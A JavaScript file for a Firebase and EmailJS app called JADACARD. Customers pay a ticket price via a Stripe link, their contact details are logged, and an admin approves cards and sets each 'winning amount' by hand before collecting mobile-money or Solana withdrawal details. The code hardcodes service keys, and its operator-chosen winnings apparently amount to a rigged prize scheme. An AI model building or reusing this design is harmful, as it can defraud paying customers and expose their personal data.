
// ==========================================
// JADACARD - main.js PART 1
// Firebase + EmailJS + Admin Control
// No app payments - Stripe link only
// ==========================================

import { initializeApp } from "firebase/app";
import { getFirestore, collection, addDoc, updateDoc, doc, onSnapshot, query, orderBy } from "firebase/firestore";

// FIREBASE CONFIG - YOURS
const firebaseConfig = {
  apiKey: "AIzaSyB5jGFyvFxHY4mlejAvSerYkqqHq_J7YKQ",
  authDomain: "jada-card.firebaseapp.com",
  projectId: "jada-card",
  storageBucket: "jada-card.firebasestorage.app",
  messagingSenderId: "658789024478",
  appId: "1:658789024478:web:78b85f82d87e9cdbf4b84f"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// EMAILJS INIT - YOURS
emailjs.init("I12UIAChWa_pR03-M");

// ==========================================
// 1. CUSTOMER TAPS "PAY FOR CARD" 
// Card issued as PENDING immediately, whether they pay on Stripe or not
// All details go to admin panel + email alert
// ==========================================
export async function logCustomerAttempt(customerData) {
  try {
    const docRef = await addDoc(collection(db, "customers"), {
      name: customerData.name,
      phone: customerData.phone,
      email: customerData.email || '',
      cardNumber: 'CARD-' + Date.now(),
      amountPaid: customerData.amountPaid || 5000, // Your ticket price
      status: "pending", // Pending until you approve
      winningAmount: 0,  // You set this manually
      withdrawalMethod: "", // MTN, 【entity-Airtel¦canonical_name=Airtel】, Solana
      withdrawalDetails: "", // Phone number or wallet address
      tappedPayAt: new Date(),
      approvedAt: null
    });

    // Send email alert to admin instantly
    await emailjs.send("service_93u3", "template_8lpidat", {
      customer_name: customerData.name,
      customer_phone: customerData.phone,
      customer_email: customerData.email || 'No email',
      card_number: 'CARD-' + Date.now(),
      amount_paid: customerData.amountPaid || 5000,
      time: new Date().toLocaleString(),
      message: 'Customer tapped Pay for Card. Check Stripe to confirm payment.'
    });

    console.log("Customer logged. ID:", docRef.id);
    return docRef.id;
    
  } catch (error) {
    console.error("Error logging customer:", error);
    throw error;
  }
}

// ==========================================
// 2. ADMIN: Get all customers in real-time
// Shows everyone who tapped "Pay" whether they paid Stripe or not
// ==========================================
export function getAllCustomersRealtime(callback) {
  const q = query(collection(db, "customers"), orderBy("tappedPayAt", "desc"));
  onSnapshot(q, (snapshot) => {
    const customers = snapshot.docs.map(d => ({ id: d.id, ...d.data() }));
    callback(customers);
  });
}

// ==========================================
// 3. ADMIN: Approve customer with manual winning amount
// ✅ Button → Card becomes ACTIVE, user can tap to see amount
// ==========================================
export async function approveCustomer(customerId, amount) {
  try {
    if (!amount || amount <= 0) {
      throw new Error("Enter winning amount first!");
    }
    
    await updateDoc(doc(db, "customers", customerId), { 
      status: "active",
      winningAmount: parseInt(amount),
      approvedAt: new Date()
    });
    
    console.log(`Customer ${customerId} approved with UGX ${amount}`);
    
  } catch (error) {
    console.error("Error approving:", error);
    throw error;
  }
}

// ==========================================
// 4. ADMIN: Reject customer
// ❎ Button → Card disappears, user area becomes normal
// ==========================================
export async function rejectCustomer(customerId) {
  try {
    await updateDoc(doc(db, "customers", customerId), { 
      status: "rejected"
    });
    
    console.log(`Customer ${customerId} rejected`);
    
  } catch (error) {
    console.error("Error rejecting:", error);
    throw error;
  }
}

// ==========================================
// 5. CUSTOMER: Save withdrawal details
// MTN, Airtel, or Solana wallet address
// ==========================================
export async function saveWithdrawalDetails(customerId, method, details) {
  try {
    await updateDoc(doc(db, "customers", customerId), {
      withdrawalMethod: method,
      withdrawalDetails: details
    });
    console.log(`Withdrawal details saved for ${customerId}`);
  } catch (error) {
    console.error("Error saving withdrawal:", error);
    throw error;
  }
}

export { app };
